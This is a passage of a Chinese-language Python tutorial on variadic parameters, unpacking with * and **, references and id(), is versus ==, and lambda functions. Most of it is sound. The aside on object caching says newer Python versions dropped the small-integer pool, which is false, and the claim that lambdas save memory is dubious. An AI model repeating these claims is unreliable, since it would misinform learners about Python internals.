<code>kwargs</code>为字典</li><li>一般情况下<code>*args</code>、<code>**kwargs</code>基本上都会在<strong>形参的最右侧</strong></li><li><code>args</code>与<code>kwargs</code>的名字可以变，例如叫<code>*aa</code>，<code>**bb</code>都是可以，但一般为了能够让其他的开发者快速读懂我们的代码最好还是不改</li></ul><blockquote><p>简而言之函数传递的参数，<strong>左边优先放未命名参数，右边放命名参数</strong></p><p>这样在传递参数的时候，就会产生左边都是未命名参数，右边都是命名参数的情况，更符合规范</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sum_nums_3(  200, 300, 400, 500, 600, 700,a= 100,mm=800, nn=900)</span><br></pre></td></tr></table></figure><p>大概是这样一个顺序，约定俗称的规矩：<code>fun(普通形参，默认参数，*args，**kwargs)</code></p><p>上面这是定义函数的方式，很少出现下面这种情况，</p></blockquote><h3 id="特殊情况"><a href="#特殊情况" class="headerlink" title="特殊情况"></a>特殊情况</h3><blockquote><p>不推荐这样写，不推荐这样定义函数</p></blockquote><p>默认参数在<code>*args</code>的后面</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sum_nums_3</span>(<span class="params">a, *args, b=<span class="number">22</span>, c=<span class="number">33</span>, **kwargs</span>):</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line">    <span class="built_in">print</span>(b)</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br><span class="line">    <span class="built_in">print</span>(args)</span><br><span class="line">    <span class="built_in">print</span>(kwargs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sum_nums_3(<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>, <span class="number">400</span>, <span class="number">500</span>, <span class="number">600</span>, <span class="number">700</span>, b=<span class="number">1</span>, c=<span class="number">2</span>, mm=<span class="number">800</span>, nn=<span class="number">900</span>)</span><br></pre></td></tr></table></figure><p>说明：</p><ul><li><code>*args</code>后可以有默认参数，想要给这些默认参数在调用时传递参数，需要用命名参数传递，否则多余的未命名参数都会给<code>args</code></li><li>如果有<code>**kwargs</code>的话，<code>**kwargs</code>必须是最后的</li></ul><p>输出结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">100</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">(200, 300, 400, 500, 600, 700)</span><br><span class="line">&#123;&#x27;mm&#x27;: 800, &#x27;nn&#x27;: 900&#125;</span><br></pre></td></tr></table></figure><h1 id="函数返回值拆包"><a href="#函数返回值拆包" class="headerlink" title="函数返回值拆包"></a>函数返回值拆包</h1><h2 id="什么是函数返回值拆包"><a href="#什么是函数返回值拆包" class="headerlink" title="什么是函数返回值拆包"></a>什么是函数返回值拆包</h2><p>函数返回值拆包：如果一个函数通过<code>return</code>返回了一个元组、列表、集合，可以通过拆包的方式将返回值进行拆分到每个变量中，这就是返回值拆包。</p><p>示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span></span><br><span class="line"></span><br><span class="line">a, b, c = test()</span><br><span class="line"><span class="built_in">print</span>(a, b, c)</span><br></pre></td></tr></table></figure><h2 id="返回值拆包的作用"><a href="#返回值拆包的作用" class="headerlink" title="返回值拆包的作用"></a>返回值拆包的作用</h2><p>通过函数返回值拆包，可以快速的将具体的数据用变量进行存储，这样对数据的处理会更加方便</p><p>示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过返回值拆包，快速使用每个数据</span></span><br><span class="line">a, b, c = test()</span><br><span class="line"><span class="built_in">print</span>(a + b + c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 没有通过返回值拆包，这样用数据时稍微复杂</span></span><br><span class="line">ret = test()</span><br><span class="line"><span class="built_in">print</span>(ret[<span class="number">0</span>] + ret[<span class="number">1</span>] + ret[<span class="number">2</span>])</span><br></pre></td></tr></table></figure><h2 id="拆包的使用"><a href="#拆包的使用" class="headerlink" title="拆包的使用"></a>拆包的使用</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_my_info</span>():</span><br><span class="line">    high = <span class="number">178</span></span><br><span class="line">    weight = <span class="number">100</span></span><br><span class="line">    age = <span class="number">18</span></span><br><span class="line">    <span class="keyword">return</span> high, weight, age</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># result = get_my_info()</span></span><br><span class="line"><span class="comment"># print(result)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过返回值拆包，能够更加方便的对每个数据使用</span></span><br><span class="line">my_high, my_weight, my_age = get_my_info()</span><br><span class="line"><span class="built_in">print</span>(my_high)</span><br><span class="line"><span class="built_in">print</span>(my_weight)</span><br><span class="line"><span class="built_in">print</span>(my_age)</span><br></pre></td></tr></table></figure><h2 id="使用拆包时的注意点"><a href="#使用拆包时的注意点" class="headerlink" title="使用拆包时的注意点"></a>使用拆包时的注意点</h2><ul><li>拆包时要注意，需要拆的数据的个数要与变量的个数相同，否则程序会异常</li></ul><h1 id="通过星号拆包"><a href="#通过星号拆包" class="headerlink" title="通过星号拆包"></a>通过星号拆包</h1><h2 id="通过普通方式拆包"><a href="#通过普通方式拆包" class="headerlink" title="通过普通方式拆包"></a>通过普通方式拆包</h2><p>假如有以下函数：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    <span class="built_in">print</span>(a + b + c)</span><br></pre></td></tr></table></figure><p>现在自己拥有的数据：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nums = [<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>]</span><br></pre></td></tr></table></figure><p>怎样才能在调用<code>test</code>函数的时候，将<code>nums</code>给传递过去呢?</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    <span class="built_in">print</span>(a + b + c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nums = [<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>]</span><br><span class="line">test(nums[<span class="number">0</span>], nums[<span class="number">1</span>], nums[<span class="number">2</span>])</span><br></pre></td></tr></table></figure><p>上述代码用的方式虽然能行，但不是很简洁</p><p>为了能够用更加简洁的方式实现上述场景需求，Python可以通过<code>*</code>、<code>**</code>将数据拆包后传递</p><h2 id="使用-拆包"><a href="#使用-拆包" class="headerlink" title="使用*拆包"></a>使用<code>*</code>拆包</h2><p>有时在调用函数时，这个函数需要的是多个参数，而自己拥有的是一个列表或者集合这样的数据，此时就用可以用<code>*</code>拆包</p><p>使用方式：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">*列表</span><br><span class="line">*元组</span><br><span class="line">*集合</span><br></pre></td></tr></table></figure><p>用<code>*</code>拆包的方式实现上述功能：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    <span class="built_in">print</span>(a + b + c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nums = [<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>]</span><br><span class="line">test(*nums)  <span class="comment"># 此时的*的作用就是拆包，此时*nums相当于11, 22, 33 即test(11, 22, 33)</span></span><br></pre></td></tr></table></figure><p>如果为数据元组时使用方式与上述代码一致：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    <span class="built_in">print</span>(a + b + c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nums = (<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>)</span><br><span class="line">test(*nums)</span><br></pre></td></tr></table></figure><p>集合类型同上：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    <span class="built_in">print</span>(a + b + c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nums = &#123;<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>&#125;</span><br><span class="line">test(*nums)</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li><code>*</code>对<u>列表、元组、集合</u>可以拆包，但<strong>一般都是在调用函数时用</strong></li></ul><h2 id="使用-拆包-1"><a href="#使用-拆包-1" class="headerlink" title="使用**拆包"></a>使用<code>**</code>拆包</h2><p>使用<code>**</code>可以对字典进行拆包，拆包的结果是命名参数</p><p>示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">name, age, address</span>):</span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line">    <span class="built_in">print</span>(age)</span><br><span class="line">    <span class="built_in">print</span>(address)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">info = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;顾安&quot;</span>,</span><br><span class="line">    <span class="string">&quot;age&quot;</span>: <span class="number">18</span>,</span><br><span class="line">    <span class="string">&quot;address&quot;</span>: <span class="string">&quot;长沙&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test(**info)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">当前**info相当于以下代码：</span></span><br><span class="line"><span class="string">name=&#x27;顾安&#x27;</span></span><br><span class="line"><span class="string">age=18</span></span><br><span class="line"><span class="string">address=&#x27;长沙&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">** 主要对字典进行拆包</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h2><p>学习不定长参数时，掌握了<code>*args</code>、<code>**kwargs</code></p><p>现在学习拆包时，也用到了<code>*</code>、<code>**</code></p><p>那它们之间有什么关系呢？</p><p>答：没有任何关系，只是长得像罢了</p><p>示例一：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test1</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;----在test1函数中----&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;args:&quot;</span>, args)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;kwargs&quot;</span>, kwargs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test2</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;----在test2函数中----&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;args:&quot;</span>, args)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;kwargs&quot;</span>, kwargs)</span><br><span class="line">    test1(args, kwargs)  <span class="comment"># 在函数test1传递参数时没有进行拆包</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test2(<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>, name=<span class="string">&quot;顾安&quot;</span>, age=<span class="number">18</span>)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">----在test2函数中----</span><br><span class="line">args: (11, 22, 33)</span><br><span class="line">kwargs &#123;&#x27;name&#x27;: &#x27;顾安&#x27;, &#x27;age&#x27;: 18&#125;</span><br><span class="line">----在test1函数中----</span><br><span class="line">args: ((11, 22, 33), &#123;&#x27;name&#x27;: &#x27;顾安&#x27;, &#x27;age&#x27;: 18&#125;)</span><br><span class="line">kwargs &#123;&#125;</span><br></pre></td></tr></table></figure><p>示例二：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test1</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;----在test1函数中----&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;args:&quot;</span>, args)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;kwargs&quot;</span>, kwargs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test2</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;----在test2函数中----&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;args:&quot;</span>, args)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;kwargs&quot;</span>, kwargs)</span><br><span class="line">    test1(*args, **kwargs)  <span class="comment"># 对参数进行了拆包</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test2(<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>, name=<span class="string">&quot;顾安&quot;</span>, age=<span class="number">18</span>)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">----在test2函数中----</span><br><span class="line">args: (11, 22, 33)</span><br><span class="line">kwargs &#123;&#x27;name&#x27;: &#x27;顾安&#x27;, &#x27;age&#x27;: 18&#125;</span><br><span class="line">----在test1函数中----</span><br><span class="line">args: (11, 22, 33)</span><br><span class="line">kwargs &#123;&#x27;name&#x27;: &#x27;顾安&#x27;, &#x27;age&#x27;: 18&#125;</span><br></pre></td></tr></table></figure><h1 id="Python语言中的引用概念"><a href="#Python语言中的引用概念" class="headerlink" title="Python语言中的引用概念"></a><code>Python</code>语言中的引用概念</h1><h2 id="引入-3"><a href="#引入-3" class="headerlink" title="引入"></a>引入</h2><p>如下代码中，最后b的值为多少？</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = a</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><p>如下代码中，最后b的值为多少？</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = a</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.append(<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure><h2 id="什么是引用"><a href="#什么是引用" class="headerlink" title="什么是引用"></a>什么是引用</h2><p>引用：就是<strong>地址</strong></p><p>那地址是什么呢？可以理解为存放数据的空间在内存中的编号</p><p>例如：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">100</span></span><br></pre></td></tr></table></figure><p>怎样知道它的地址呢？</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">id</span>(a)</span><br></pre></td></tr></table></figure><p>可以直接将上述的结果打印：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(a))</span><br></pre></td></tr></table></figure><p>运行结果（在不同机器上输出的地址可能不相同）：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">4347271232</span><br></pre></td></tr></table></figure><p>当我们知道了原来引用就是地址之后，再来看如下代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>]</span><br></pre></td></tr></table></figure><p>我们可以用<code>id(a)</code>取它的地址：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(a))  <span class="comment"># 获取变量存储的引用（地址）是多少</span></span><br></pre></td></tr></table></figure><p>接下来定义变量b并且赋值：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(a))  <span class="comment"># 获取变量存储的引用（地址）是多少</span></span><br><span class="line"></span><br><span class="line">b = a</span><br></pre></td></tr></table></figure><p>此时输出变量b的引用：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(a))</span><br><span class="line"></span><br><span class="line">b = a</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(b))</span><br></pre></td></tr></table></figure><p>运行结果（不同机器上的内存地址可能不相同）：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">4558971360</span><br><span class="line">4558971360</span><br></pre></td></tr></table></figure><p>这说明，此时变量a、b存储的引用都是相同的</p><p>由此我们可以得出一个结论：<strong>Python中的变量并不是真正存储数据，而是存储的数据所在内存中的地址，我们一般称之为引用</strong></p><p>既然变量a、b都指向同一个列表，那么接下来</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a.append(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>此时变量a、b指向的同一个列表中多了一个数据，即此时列表为<code>[1, 2, 3]</code></p><p>所以a、b此时用<code>print</code>输出相同的结果</p><h3 id="关于对象缓存池"><a href="#关于对象缓存池" class="headerlink" title="关于对象缓存池"></a><strong>关于对象缓存池</strong></h3><blockquote><p>大家自己试试看a&#x3D;257, b&#x3D;257时它们的id还是否会相等。事实上Python 为了优化速度，使用了<strong>小整数对象池</strong>，避免为整数频繁申请和销毁内存空间。而Python 对小整数的定义是 [-5, 257)，只有数字在-5到256之间它们的id才会相等，超过了这个范围就不行了</p><p>同样的道理，<strong>字符串对象</strong>也有一个类似的缓冲池，超过区间范围内自然不会相等了。 </p><p>总的来说，<strong>只有数值型和字符串型</strong>，并且在通用对象池中的情况下，a is b才为True，否则当a和b是int，str，tuple，list，dict或set型时，a is b均为False。</p></blockquote><blockquote><p>手测后发现<strong>小整数对象池</strong>在低版本python中有，高版本没有再使用这个东西了，高版本智能很多，不过对tuple，list，dict或set型时依旧没有对象池这么一说</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">b=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(a))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(b))</span><br><span class="line"><span class="keyword">if</span>(a <span class="keyword">is</span> b):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;no&quot;</span>)</span><br><span class="line"><span class="comment">#输出no</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符="></a>赋值运算符<code>=</code></h2><p>赋值运算符<code>=</code>，之前为了更好的理解变量，把<code>a=100</code>理解为变量a中存放了<code>100</code>，事实上变量<code>a</code>存储是<code>100</code>的引用</p><p>也就是说：在Python中只要用<code>=</code>那么就表示<code>=</code>左边的变量存储了一个新的引用</p><p>大白话讲：就是<code>=</code>左边的变量<strong>指向</strong>了右边的数据</p><p>想想下面的代码运行的结果是什么？</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">b = a</span><br><span class="line">b.append(<span class="number">3</span>)</span><br><span class="line">b = [<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">[100, 200, 300]</span><br></pre></td></tr></table></figure><p>而不是：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">[1, 2, 3]</span><br></pre></td></tr></table></figure><h2 id="Python中is和-的区别"><a href="#Python中is和-的区别" class="headerlink" title="Python中is和==的区别"></a>Python中<code>is</code>和<code>==</code>的区别</h2><p>Python中对象包含的三个基本要素，分别是：<code>id</code>(身份标识)、<code>type</code>(数据类型)和<code>value</code>(值)。</p><p><code>is</code>和<code>==</code>都是对对象进行比较判断作用的，但对对象比较判断的内容并不相同</p><ul><li><code>==</code>是python标准操作符中的<strong>比较操作符</strong>，用来比较判断两个对象的<code>value</code>(值)是否相等，</li><li><code>is</code>也被叫做<strong>同一性运算符</strong>，这个运算符比较判断的是对象间的唯一身份标识，也就是<code>id</code>是否相同</li></ul><h2 id="Python中isinstance-和type-的区别"><a href="#Python中isinstance-和type-的区别" class="headerlink" title="Python中isinstance()和type()的区别"></a>Python中<code>isinstance()</code>和<code>type()</code>的区别</h2><ul><li>type() 不会认为子类是一种父类类型，不考虑继承关系。</li><li>isinstance() 会认为子类是一种父类类型，考虑继承关系。</li></ul><p>如果要判断两个类型是否相同推荐使用 <code>isinstance()</code>。</p><blockquote><p><code>isinstance()</code>判断当前这个对象是否是我指定对象的子类</p><p><code>isinstance()</code> 函数来判断一个对象是否是一个已知的类型，类似 <code>type()</code>。</p><p>以下是 isinstance() 方法的语法:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">isinstance</span>(<span class="built_in">object</span>, classinfo)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;a = <span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">isinstance</span> (a,<span class="built_in">int</span>)</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="函数实参皆为引用"><a href="#函数实参皆为引用" class="headerlink" title="函数实参皆为引用"></a>函数实参皆为引用</h2><p>有一个问题：<strong>Python是使用值传递还是引用传递？</strong></p><p>Python中调用函数时，<strong>传递实参实际上都是是引用，即传递的都是地址</strong></p><p><u><strong>只要是传递的引用，那么也就是说在函数中是可以直接对指向的数据进行修改</strong></u></p><p>Python参数传递统一使用的是引用传递方式。因为Python对象分为<strong>可变对象</strong>(<code>list,dict,set</code>)和<strong>不可变对象</strong>(<code>tuple,string,int,float,bool</code>)，当传递的参数是可变对象的引用时，因为可变对象的值可以修改，因此可以通过修改参数值而修改原对象，这类似于C语言中的引用传递；当传递的参数是不可变对象的引用时，虽然传递的是引用，参数变量和原变量都指向同一内存地址，但是不可变对象无法修改，所以参数的重新赋值不会影响原对象，这类似于C语言中的值传递。</p><blockquote><p>参考：<a href="https://blog.csdn.net/hohaizx/article/details/78427406">python是值传递还是引用传递</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">p</span>):</span><br><span class="line">    <span class="comment"># 此时变量p也指向nums指向的列表</span></span><br><span class="line">    p.append(<span class="number">44</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;在函数test中，p=&quot;</span>, p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nums = [<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;调用test函数之前，nums=&quot;</span>, nums)</span><br><span class="line">test(nums)  <span class="comment"># 此时将列表的引用当做了实参进行传递</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;调用test函数之后，nums=&quot;</span>, nums)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">调用test函数之前，nums= [11, 22, 33]</span><br><span class="line">在函数test中，p= [11, 22, 33, 44]</span><br><span class="line">调用test函数之后，nums= [11, 22, 33, 44]</span><br></pre></td></tr></table></figure><h2 id="函数名也是引用"><a href="#函数名也是引用" class="headerlink" title="函数名也是引用"></a>函数名也是引用</h2><h3 id="引入-4"><a href="#引入-4" class="headerlink" title="引入"></a>引入</h3><p>阅读如下代码，思考会输出什么结果</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test1</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;我是test1函数哦。。。。&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test2</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;我是test2函数哦。。。。&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test1()</span><br><span class="line"></span><br><span class="line">test1 = test2</span><br><span class="line">test1()</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">我是test1函数哦。。。。</span><br><span class="line">我是test2函数哦。。。。</span><br></pre></td></tr></table></figure><p>你可能会惊讶，为什么第9行调用test1函数输出的是<code>我是test1函数哦。。。。</code>，而到了第12行再次调用test1函数时变成了<code>我是test2函数哦。。。。</code></p><p>上述问题的原因核心点是：在Python中即使是函数名也是一个变量名，只不过这个变量没有指向普通的数据，而是指向了一段代码；也就是说如果定义了一个函数名字叫做<code>test1</code>就好比是一个变量名<code>test1</code>指向了那个代码块而已，所以当上述代码第11行<code>test1 = test2</code>时，就相当于让<code>test1</code>变量不在指向原本的代码块，而是指向新的代码块即<code>test2</code>指向的代码块，所以当第12行执行<code>test1</code>函数时，会输出<code>我是test2函数哦。。。。</code></p><h3 id="引用的作用"><a href="#引用的作用" class="headerlink" title="引用的作用"></a>引用的作用</h3><p>看完上述的引入知识后，相信你会对什么是函数的引入有一个大体的认知了</p><p>在此简单总结：所谓函数名当做引用，其实是指在Python中所有的函数名实际上是一个变量名，只不过这个变量名指向的不是常见的数据，而是一段代码，当我们用<code>函数名()</code>是实际上就是让指向的这块代码开始执行，当我们只用<code>函数名</code>时其实就是这个函数的引用</p><p>记住：既然函数名也是变量名，那么就可以给它赋值获取它的引用给别的变量</p><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><ol><li>使用<code>def</code>定义的函数名，实际就是个<strong>变量名它存储了函数的引用</strong></li><li>如果将另外一个变量，例如<code>b</code>保存了函数的引用，即也指向了同一个函数，那么<code>b()</code>就是调用函数</li></ol><h1 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h1><h2 id="什么是匿名函数"><a href="#什么是匿名函数" class="headerlink" title="什么是匿名函数"></a>什么是匿名函数</h2><p>没有名字的函数，在Python中用<code>lambda</code>定义</p><p>示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">lambda</span> x, y: x + y  <span class="comment"># 定义了一个匿名函数 1.没有名字 2.完成2个数的加法操作</span></span><br></pre></td></tr></table></figure><h2 id="匿名函数的作用"><a href="#匿名函数的作用" class="headerlink" title="匿名函数的作用"></a>匿名函数的作用</h2><ol><li>可以用一行代码完成简单的函数定义</li><li>可以当做实参快速传递到函数中去</li><li>节约内存</li></ol><h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><p>用<code>lambda</code>关键词能创建匿名函数。这种函数得名于省略了用<code>def</code>声明函数的标准步骤</p><p><code>lambda</code>函数的语法只包含一个语句，如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">lambda</span> 形参<span class="number">1</span>, 形参<span class="number">2</span>, 形参<span class="number">3</span>: 表达式</span><br></pre></td></tr></table></figure><p>注意点：<code>lambda</code>函数能接收<strong>任何数量的参数</strong>但只能<strong>返回一个表达式</strong>的值，其默认就是返回的，不用写<code>return</code></p><p>既然我们已经知道<code>def</code>定义函数时的变量存储的是函数的引用，所以只要有了这个函数的引用，也就可以通过<code>变量名()</code>的方式调用函数</p><p>而函数分为<code>def</code>定义的普通函数，和用<code>lambda</code>定义的匿名函数，所以无论一个变量例如<code>b</code>保存的是普通函数的引用，还是匿名函数的引用，都可以用<code>b()</code>方式调用b指向的函数</p><p>一般情况下对匿名函数的使用有2种方式</p><ol><li>通过<code>lambda</code>定义匿名函数，然后用一个变量指向这个匿名函数，然后通过<code>变量名()</code>调用这个匿名函数</li><li>直接在调用其它函数实参的位置通过<code>lambda</code>定义匿名函数，会将这个匿名函数的引用当做实参进行传递</li></ol><p>方式一：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义了一个匿名函数，然后让变量add_2_nums指向它</span></span><br><span class="line">add_2_nums = <span class="keyword">lambda</span> x, y: x + 